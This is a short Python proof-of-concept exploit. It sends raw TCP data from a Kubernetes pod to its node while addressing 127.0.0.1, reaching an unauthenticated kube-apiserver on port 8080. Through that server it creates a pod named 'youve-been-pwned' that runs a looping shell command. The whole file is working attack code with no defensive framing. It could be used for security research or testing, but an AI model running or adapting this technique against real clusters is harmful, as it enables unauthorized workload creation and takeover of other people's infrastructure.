import os
from packets.tcp_exchange import send_tcp_data

def main():
    real_dst = os.environ['NODE_IP']
    dst = '127.0.0.1'
    dst_port = 8080 # unauthenticated kube apiserver
    src = os.environ['POD_IP']
    src_port = 25565 # i like minecraft

    http_req_headers = b'POST /api/v1/namespaces/default/pods HTTP/1.0\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 213\r\n\r\n'
    http_payload = b'{"apiVersion":"v1","kind":"Pod","metadata":{"name":"youve-been-pwned"},"spec":{"containers":[{"name":"alpine","image":"alpine:latest","command":["/bin/sh","-c","--"],"args":["while true; do echo PWNED; done;"]}]}}'
    data = http_req_headers + http_payload

    response_data = send_tcp_data(real_dst, dst, dst_port, src, src_port, data)
    print(response_data.decode("utf-8"))

if __name__ == '__main__':
    main()
